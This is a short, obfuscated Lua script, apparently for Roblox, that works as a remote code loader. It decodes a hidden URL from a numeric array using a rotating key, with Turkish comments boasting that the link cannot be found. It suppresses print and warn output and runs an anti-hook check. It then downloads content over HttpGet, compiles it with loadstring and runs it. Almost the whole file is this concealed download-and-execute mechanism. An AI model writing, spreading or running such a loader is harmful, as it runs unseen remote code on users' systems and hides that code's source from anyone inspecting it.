local _S = string; local _T = table; local _G = game;
local _D = {114,127,128,125,129,73,63,64,114,117,128,130,61,114,117,129,118,132,114,134,133,120,134,120,133,133,140,126,136,143,74,128,141,140,79,88,117,132,154,142,154,136,154,88,93,96,141,99,147,147,145,150,152,107,154,103,156,159,163,162,158,165,154,167,156,158,164,165,163,164,164,166,120,119,121,173,120,188,172,195,124,176,128,201,178,178,180,183,185,132,133,183,205,200,198,201,203,205,214,208,205,212,212,213,205,217,219,218,218,211,211,211,225,219,226,226,227,229,221,230,227,222,232,232,229,235,190,230,223,239,203,242,225,247,235,247,224,242,203,231,245,227,203,228,232,248,235}

local function _SOLVE(_DATA)
    local _R = ""
    for i = 1, #_DATA do
        -- GERÇEK DİNAMİK ROTASYON: Her karakterin anahtarı sırasına göre değişir
        -- Bu algoritmayı çözmeden linki asla bulamazlar.
        local _K = (i % 8) + (math.floor(i/10) % 5) + 8
        _R = _R .. _S.char(_DATA[i] - _K)
    end
    return _R
end

local _PROXY = {
    ["\103\101\116"] = function(o, u) return o:HttpGet(u, true) end,
    ["\108\100\115"] = loadstring
}

local function _EXEC()
    local p, w = print, warn;
    print, warn = function() end, function() end;
    
    -- Anti-Hook & Environment Check
    local _env = getfenv and getfenv() or {}
    if _env.print ~= print then 
        local _url = _SOLVE(_D)
        local _ok, _content = pcall(_PROXY["\103\101\116"], _G, _url .. "?v=" .. math.random(100,999))
        
        print, warn = p, w;
        
        if _ok and _content and #_content > 10 then
            local _f = _PROXY["\108\100\115"](_content)
            if _f then 
                task.spawn(_f) 
            end
        end
    end
end

_EXEC()
